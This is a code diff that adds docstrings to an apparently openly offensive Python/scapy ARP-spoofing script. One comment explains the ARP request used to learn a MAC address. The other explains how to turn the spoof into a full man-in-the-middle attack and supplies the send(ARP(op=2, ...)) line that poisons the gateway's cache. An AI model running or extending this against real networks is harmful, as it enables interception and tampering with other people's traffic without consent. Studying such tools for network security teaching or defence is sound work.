@@ -10,6 +10,10 @@ import time
 
 
 def getMAC(ip):
+    """
+    Sends an ARP req. (op code 1). The hwdst must be all f's (bcast). The
+    pdst is the IP you're asking for.
+    """
     resp = sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), \
             retry=2, timeout=10, verbose=False)
     if resp[ARP].hwsrc:
@@ -24,6 +28,15 @@ def arpSpoof(gwIP, gwMAC, tgtIP, tgtMAC):
     hwsrc = Ethernet header source (It's always us)
     pdst  = ARP Destination IP (Who we want to trick)
     psrc  = ARP Source IP (Who we want to become)
+
+    In this case you're just spoofing a device into thinking you're the
+    gateway. You can extend this by adding a line that makes the gw think
+    you're the other device, thus creating a MITM attack. The line would be
+    something like:
+    
+    send(ARP(op=2, pdst=gwIP, hwdst=gwMAC, psrc=tgtIP), \
+            verbose=False)
+
     """
     print("[*] Starting ARP spoofing [Ctrl-C to stop]")
     try:
